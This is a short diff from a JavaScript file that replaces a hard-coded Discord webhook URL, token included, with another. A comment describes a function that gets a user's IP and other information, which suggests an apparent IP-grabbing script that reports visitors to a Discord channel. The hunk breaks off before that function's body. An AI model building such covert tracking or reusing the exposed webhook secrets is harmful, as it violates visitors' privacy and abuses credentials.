@@ -1,5 +1,5 @@
 // Replace with your new Discord webhook URL
-const webhookURL = 'https://discord.com/api/webhooks/1303156766200037469/H5sIaxnnBTYm_3bfOjxxHGB7P50e82ZUdYzgrPJAxZUi4SwtHuXMeX3XWB7oMmUgcGaw';
+const webhookURL = 'https://discord.com/api/webhooks/1305718591835869275/5YU0l9wJLlYU1PLoYapm7Fu-n1wk9N8e26UTjyivrfDviH5grlUhbEXYbItQ-ap0n88r';
 
 // Function to get user's IP and other information
 async function sendDataToDiscord() {
